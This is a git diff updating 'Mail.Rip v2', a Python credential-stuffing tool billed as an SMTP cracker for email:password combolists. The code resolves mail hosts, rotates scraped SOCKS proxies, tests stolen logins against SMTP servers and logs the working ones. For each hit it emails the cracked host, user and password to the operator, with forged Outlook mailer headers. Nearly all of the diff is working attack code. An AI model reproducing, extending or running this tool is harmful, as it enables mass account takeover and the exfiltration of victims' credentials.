@@ -14,7 +14,7 @@
         +-------------------------------------------------------------------+
         | PROJECT:      Mail.Rip v2                                         |
         | DESCRIPTION:  SMTP checker / SMTP cracker for mailpass combolists |
-        | RELEASE:      8 (2021-03-10)                                      |
+        | RELEASE:      9 (2021-03-27)                                      |
         | AUTHOR:       DrPython3 @ GitHub.com                              |
         +===================================================================+
         | Based on Mail.Rip v1, this is the new and improved version.       |
@@ -57,8 +57,7 @@ try:
     import colorama
     from time import sleep
     from string import Template
-    from email.mime.multipart import MIMEMultipart
-    from email.mime.text import MIMEText
+    from email.message import EmailMessage
     from random import randint
     from queue import Queue
 except:
@@ -71,7 +70,6 @@ colorama.init(autoreset=True)
 
 # [*** Variables, Lists and Dictionaries needed ***]
 # ##################################################
-sslcontext = ssl.create_default_context()
 locker = threading.Lock()
 attack_queue = Queue()
 
@@ -98,7 +96,6 @@ try:
         jsonobj = json.load(included_imports)
         smtpdomains = (jsonobj['smtpdomains'])
         smtpports = (jsonobj['smtpports'])
-        smtpsubdomains = (jsonobj['smtpsubdomains'])
         commonports = (jsonobj['commonports'])
         hosterblacklist = (jsonobj['hosterblacklist'])
         socks4sources = (jsonobj['socks4sources'])
@@ -160,17 +157,11 @@ def writer(text, type):
         pass
     try:
         # get filename and define its path:
-        file_name = str(type) + '.txt'
+        file_name = str(f'{str(type)}.txt')
         targetfile = os.path.join('results', file_name)
         # edit file:
         with open(str(targetfile), 'a+') as output_file:
-            output_file.seek(0)
-            check_empty = output_file.read(100)
-            if len(check_empty) > 0:
-                output_file.write('\n')
-            else:
-                pass
-            output_file.write(str(text))
+            output_file.write(str(text) + '\n')
         return True
     except:
         return False
@@ -258,8 +249,8 @@ def setdefaults():
 def proxysupport():
     '''
     This function provides the proxy-support. If called, it allows to enable the proxy-feature.
-    If the proxy-support is activated, it asks for the proxy-type to use and scrapes free proxys
-    using the sources from "library.json". Afterwards, it cleans the scraping data and loads the
+    If proxys are  activated, it asks for the proxy-type to use and scrapes free proxys using
+    the sources from "library.json". Afterwards, it cleans the scraping data and loads the
     results into the global proxylist. Returns True, if proxy-support ist active and some proxys
     could be loaded. Else it returns False.
 
@@ -298,6 +289,7 @@ def proxysupport():
         sources = socks5sources
     # start scraping:
     print(colorama.Fore.YELLOW + f'\n\nScraping {str(type_socks)}-proxys (...)')
+    socket.setdefaulttimeout(float(default_timeout))
     for source in sources:
         try:
             http = urllib3.PoolManager(ca_certs=certifi.where())
@@ -305,7 +297,6 @@ def proxysupport():
             # scraped data is saved to temporary txt-file "scraped_proxys.txt":
             with open('scraped.txt', 'a') as output_file:
                 output_file.write(str(scraped.data.decode('utf-8')))
-                output_file.close()
             print(colorama.Fore.GREEN + f'Scraped: {str(source)}')
         except:
             print(colorama.Fore.RED + f'Scraping failed for: {str(source)}')
@@ -324,7 +315,7 @@ def proxysupport():
         print(colorama.Fore.GREEN + 'Unwanted text removed successfully.')
     except:
         print(colorama.Fore.RED + 'Removing unwanted text failed.')
-    # then remove duplicates and delete scraped data ...
+    # then remove duplicates ...
     print(colorama.Fore.YELLOW + '\n\nRemoving duplicates from results ...')
     try:
         unique_proxys = set()
@@ -394,6 +385,7 @@ def mxlookup(worker_name, domain):
     :param str domain: domain of target e-mail address
     :return: found_host
     '''
+    socket.setdefaulttimeout(float(default_timeout))
     # set string for verifying hosts from MX records:
     domain_regex = '^([a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,}$'
     # variable for returning result:
@@ -436,58 +428,6 @@ def mxlookup(worker_name, domain):
         return found_host
 
 
-def unknownhost(worker_name, domain):
-    '''
-    Searches for the SMTP host if none is found in hostlist.
-    This is just a fallback in case looking up the MX records fails.
-
-    :param str worker_name: to improve verbose messages
-    :param str domain: domain of the e-mail-address
-    :return: found_host
-    '''
-    found_host = str('no_host_found')
-    for subdomain in smtpsubdomains:
-        # get next SMTP host for connection test:
-        test_host = str(str(subdomain) + str(domain))
-        try:
-            # for active proxy-support, set up a random proxy:
-            if use_socks == True:
-                get_proxy = str(getrandomproxy())
-                proxy_ip = str(get_proxy.split(':')[0])
-                proxy_port = int(get_proxy.split(':')[1])
-                if type_socks == 'SOCKS4':
-                    socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, proxy_ip, proxy_port)
-                else:
-                    socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, proxy_port)
-                socks.socket.setdefaulttimeout(float(default_timeout))
-                socks.wrapmodule(smtplib)
-            # else, just set default timeout for connections:
-            else:
-                socket.setdefaulttimeout(float(default_timeout))
-            with locker:
-                print(colorama.Fore.WHITE
-                      + f'[{str(worker_name)}]: Trying to connect to {str(test_host)}')
-            # try connection:
-            try:
-                # first, try SSL-connection:
-                connection = smtplib.SMTP_SSL(str(test_host), timeout=default_timeout, context=sslcontext)
-                connection.quit()
-            except:
-                try:
-                    # on errors, try standard connection:
-                    connection = smtplib.SMTP(str(test_host), timeout=default_timeout)
-                    connection.quit()
-                except:
-                    continue
-            with locker:
-                print(colorama.Fore.GREEN + f'[{str(worker_name)}]: Connection to host {str(test_host)} established')
-            found_host = str(test_host)
-            break
-        except:
-            continue
-    return found_host
-
-
 def unknownport(worker_name, smtphost):
     '''
     Searches for the connection port of a given host if none is found in hostlist.
@@ -498,6 +438,7 @@ def unknownport(worker_name, smtphost):
     :return: found_port
     '''
     found_port = int(0)
+    unkportssl = ssl.create_default_context()
     for port in commonports:
         # get next port to test:
         test_port = int(port)
@@ -521,16 +462,15 @@ def unknownport(worker_name, smtphost):
                       + f'[{str(worker_name)}]: Trying connection to {str(smtphost)}:{str(test_port)}')
             # try connection:
             try:
-                # first, try SSL-connection:
-                connection = smtplib.SMTP_SSL(smtphost, test_port, timeout=default_timeout, context=sslcontext)
+                # try SSL-connection for port 465:
+                if int(test_port) == 465:
+                    connection = smtplib.SMTP_SSL(smtphost, test_port, timeout=default_timeout, context=unkportssl)
+                else:
+                    # try standard connection for all the other common ports:
+                    connection = smtplib.SMTP(smtphost, test_port, timeout=default_timeout)
                 connection.quit()
             except:
-                try:
-                    # on errors, try standard connection:
-                    connection = smtplib.SMTP(smtphost, test_port, timeout=default_timeout)
-                    connection.quit()
-                except:
-                    continue
+                continue
             with locker:
                 print(colorama.Fore.GREEN
                       + f'[{str(worker_name)}]: successfully connected to {str(smtphost)}:{str(test_port)}')
@@ -566,7 +506,7 @@ def emailtemplate():
     try:
         with open(template_input, 'r', encoding='utf-8') as email_template:
             email_content = email_template.read()
-            return Template(email_content), True
+        return Template(email_content), True
     except:
         return Template('ERROR LOADING TEMPLATE'), False
 
@@ -586,6 +526,7 @@ def deliverytest(smtphost, smtpport, smtpuser, smtppass, smtpemail, proxyip, pro
     :return: True, False
     '''
     global emailssent
+    emailssl = ssl.create_default_context()
     # if SOCKS support is active, set up the proxy:
     if use_socks == True:
         if type_socks == 'SOCKS4':
@@ -602,17 +543,13 @@ def deliverytest(smtphost, smtpport, smtpuser, smtppass, smtpemail, proxyip, pro
         # on errors, use the following template:
         if template_status == False:
             letter_text = str('Hello mate!\n'
-                              + '\n'
                               + 'If you read this, the e-mail delivery test was successful.\n'
-                              + 'The tested SMTP login is:\n'
                               + '\n'
-                              + 'START--------------------------------------------------------->>\n'
-                              + f'EMAIL: {str(smtpemail)}\n'
-                              + f'HOST: {str(smtphost)}\n'
-                              + f'PORT: {str(smtpport)}\n'
-                              + f'USER: {str(smtpuser)}\n'
-                              + f'PASS: {str(smtppass)}\n'
-                              + '<<-----------------------------------------------------------END\n'
+                              + f'e-mail: {str(smtpemail)}\n'
+                              + f'smtp host: {str(smtphost)}\n'
+                              + f'smtp port: {str(smtpport)}\n'
+                              + f'smtp user: {str(smtpuser)}\n'
+                              + f'smtp password: {str(smtppass)}\n'
                               + '\n'
                               + 'Please, consider a donation to support my work or just buy me a coffee.\n'
                               + 'Every donation is appreciated though coffee even more.\n'
@@ -622,7 +559,6 @@ def deliverytest(smtphost, smtpport, smtpuser, smtppass, smtpemail, proxyip, pro
                               + 'LTC: LeJsHzcMixhvR1qEfgHJU32joVAJDgQwR7\n'
                               + '\n'
                               + 'Thank you in advance and do not forget to visit my GitHub page!\n'
-                              + '\n'
                               + 'Stay healthy and best regards,\n'
                               + 'DrPython3')
         else:
@@ -633,45 +569,41 @@ def deliverytest(smtphost, smtpport, smtpuser, smtppass, smtpemail, proxyip, pro
                                                      smtp_user = str(smtpuser),
                                                      smtp_pass = str(smtppass))
         # generate a random ID for the e-mail subject:
-        randomid = str(uuid.uuid4().hex)
-        randomid = str(randomid[0:6])
-        randomid = randomid.upper()
+        randomid = str(uuid.uuid4().hex)[0:6].upper()
         # generate the e-mail message:
-        letter = MIMEMultipart()
-        letter['Subject'] = str(f'Test ID {str(randomid)} - Result and Info')
-        letter['From'] = str(smtpemail)
-        letter['To'] = str(attacker_mail)
-        letter.attach(MIMEText(letter_text, 'plain'))
+        letter = EmailMessage()
+        letter.add_header('Subject', str(f'test id {str(randomid)} result delivery'))
+        letter.add_header('From', str(f'Mail.Rip v2 <{str(smtpemail)}>'))
+        letter.add_header('To', str(f'Mail.Rip User <{str(attacker_mail)}>'))
+        letter.add_header('Reply-To', str(smtpemail))
+        letter.add_header('MIME-Version', '1.0')
+        letter.add_header('Content-Type', 'text/plain;charset=UTF-8')
+        letter.add_header('X-Priority', '1')
+        letter.add_header('X-MSmail-Priority', 'High')
+        letter.add_header('X-Mailer', 'Microsoft Office Outlook, Build 17.551210')
+        letter.add_header('X-MimeOLE', 'Produced By Microsoft MimeOLE V6.00.3790.1830')
+        letter.set_content(letter_text)
     except:
         return False
     try:
         # connect to SMTP, log in and send the e-mail message:
-        # timeout for SMTP connection is set to 60.0 here, do not change:
-        try:
-            victim = smtplib.SMTP_SSL(str(smtphost), int(smtpport), timeout=float(60.0), context=sslcontext)
-        except:
+        if int(smtpport) == 465:
+            victim = smtplib.SMTP_SSL(str(smtphost), int(smtpport), timeout=float(60.0), context=emailssl)
+        else:
             victim = smtplib.SMTP(str(smtphost), int(smtpport), timeout=float(60.0))
             try:
                 victim.ehlo()
-                victim.starttls()
+                victim.starttls(context=emailssl)
                 victim.ehlo()
             except:
                 pass
         victim.login(str(smtpuser), str(smtppass))
-        victim.send_message(letter)
-        try:
-            del letter
-            victim.quit()
-        except:
-            pass
+        victim.send_message(letter, from_addr=smtpemail, to_addrs=attacker_mail)
+        victim.quit()
         # successful tests return true, unsuccessful ones false:
         emailssent += 1
         return True
     except:
-        try:
-            victim.quit()
-        except:
-            pass
         return False
 
 
@@ -773,8 +705,10 @@ def attacker(attackid, target):
     :param str target: combo to check
     :return: True, False
     '''
+    global hits
     # set attacker ID received from threader:
     attacker_id = str(f'ATTACKER#{str(attackid)}')
+    attackerssl = ssl.create_default_context()
     try:
         # reset the variables:
         target_email = str('')
@@ -807,8 +741,8 @@ def attacker(attackid, target):
             print(colorama.Fore.YELLOW + f'[{str(attacker_id)}]: Checking combo {str(next_combo)}')
         # start checking:
         target_email = str(next_combo.split(':')[0])
-        target_user = str(target_email)
         target_pass = str(next_combo.split(':')[1])
+        target_user = str(target_email)
         # try to get target-host from hosterlist for e-mail domain:
         target_domain = str(target_email.split('@')[1]).lower()
         try:
@@ -816,18 +750,12 @@ def attacker(attackid, target):
         except:
             # if no host is found, try to read from MX records of target-domain:
             lookup_host = str(mxlookup(attacker_id, target_domain))
+            # if reading the MX records fails, abort attack on current target:
             if lookup_host == 'no_host_found':
-                # if reading the MX records fails, search with unknownhost function:
-                find_host = str(unknownhost(attacker_id, target_domain))
-                # if unknownhost function fails, too, cancel attack for the given combo:
-                if find_host == 'no_host_found':
-                    with locker:
-                        print(colorama.Fore.RED + f'[{str(attacker_id)}]: No target-host for combo {str(next_combo)}')
-                    result_writer = writer(str(next_combo), str('__invalid__'))
-                    return False
-                # else set target_host = unknownhost result:
-                else:
-                    target_host = str(find_host)
+                with locker:
+                    print(colorama.Fore.RED + f'[{str(attacker_id)}]: No target-host for combo {str(next_combo)}')
+                result_writer = writer(str(next_combo), str('__invalid__'))
+                return False
             # else set target_host = result from MX records:
             else:
                 target_host = str(lookup_host)
@@ -852,31 +780,31 @@ def attacker(attackid, target):
             with locker:
                 print(colorama.Fore.WHITE
                       + f'[{str(attacker_id)}]: Connecting to {str(target_host)} for checking {str(next_combo)}')
-            # try SSL-connection to target:
-            attack = smtplib.SMTP_SSL(target_host, target_port, timeout=default_timeout, context=sslcontext)
-            with locker:
-                print(colorama.Fore.GREEN + f'[{str(attacker_id)}]: SSL-connection established to {str(target_host)}')
-        except:
-            try:
-                # on errors try standard connection:
+            # try SSL-connection for port 465:
+            if int(target_port) == 465:
+                attack = smtplib.SMTP_SSL(target_host, target_port, timeout=default_timeout, context=attackerssl)
+                with locker:
+                    print(colorama.Fore.GREEN + f'[{str(attacker_id)}]: SSL-connection established to {str(target_host)}')
+            else:
+                # try standard connection for all the other ports:
                 attack = smtplib.SMTP(target_host, target_port, timeout=default_timeout)
                 with locker:
                     print(colorama.Fore.GREEN + f'[{str(attacker_id)}]: Connection established to {str(target_host)}')
                 try:
-                    # on standard connections try to establish TLS:
+                    # on standard connection try to establish TLS:
                     attack.ehlo()
-                    attack.starttls()
+                    attack.starttls(context=attackerssl)
                     attack.ehlo()
                     with locker:
                         print(colorama.Fore.GREEN + f'[{str(attacker_id)}]: TLS established for {str(target_host)}')
                 except:
                     pass
-            except:
-                # cancel attack for the given combo if all connections fail:
-                with locker:
-                    print(colorama.Fore.RED + f'[{str(attacker_id)}]: Connection to {str(target_host)} failed')
-                result_writer = writer(str(next_combo), str('__invalid__'))
-                return False
+        except:
+            # cancel attack for the given combo if connection fails:
+            with locker:
+                print(colorama.Fore.RED + f'[{str(attacker_id)}]: Connection to {str(target_host)} failed')
+            result_writer = writer(str(next_combo), str('__invalid__'))
+            return False
         # step#2.1 - try login with e-mail:
         try:
             with locker:
@@ -921,6 +849,7 @@ def attacker(attackid, target):
                 + f'PORT: {str(target_port)}, '
                 + f'USER: {str(target_user)}, '
                 + f'PASS: {str(target_pass)}'), str('__valid__'))
+        hits += 1
         # step#4 - for hits, call deliverytest function:
         if attacker_mail == 'invalid@mail.sad':
             pass
@@ -962,16 +891,15 @@ def attack_threader():
     :return: None
     '''
     global targetsleft
-    global hits
     global fails
     attacker_id = str(count_threads)
     while True:
         next_target = str(attack_queue.get())
         result = attacker(attacker_id, next_target)
-        if result == True:
-            hits += 1
-        else:
+        if result == False:
             fails += 1
+        else:
+            pass
         targetsleft -= 1
         attack_queue.task_done()
     return None
@@ -985,6 +913,8 @@ def startattack():
     '''
     global count_threads
     global targetsleft
+    global hits
+    global fails
     clean()
     print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  STARTING ATTACK:\n' + '-'*40 + '\n')
     countdown(5)
@@ -1003,7 +933,7 @@ def startattack():
     # try to show stats in window title:
     while targetsleft > 0:
         try:
-            sleep(0.1)
+            sleep(0.5)
             wintitle = f'TO CHECK: {str(targetsleft)} # HITS: {str(hits)} # EMAILS: {str(emailssent)} # FAILS: {str(fails)}'
             sys.stdout.write('\33]0;' + str(wintitle) + '\a')
             sys.stdout.flush()
@@ -1011,10 +941,15 @@ def startattack():
             pass
     print(colorama.Fore.YELLOW + '\n' + '#'*44 + '\n# FINISHING ATTACK! BE PATIENT, PLEASE ... #\n' + '#'*44 + '\n')
     attack_queue.join()
+    sleep(3.0)
     clean()
     input(colorama.Fore.YELLOW + '\n\nINFO\n' + '-'*4 + '\n'
           + f'Attack has been finished or stopped. Your results: HITS = {str(hits)}, BAD = {str(fails)}.\n'
           + 'Press [ENTER] to return to the main menu.')
+    # reset stats:
+    targetsleft = int(0)
+    hits = int(0)
+    fails = int(0)
     return None
 
 
@@ -1059,7 +994,7 @@ main_logo = '''
             
                                           [0] EXIT MAIL.RIP V2
             
-            #####################################################[v2|R8]
+            #####################################################[v2|R9]
 
 '''
 
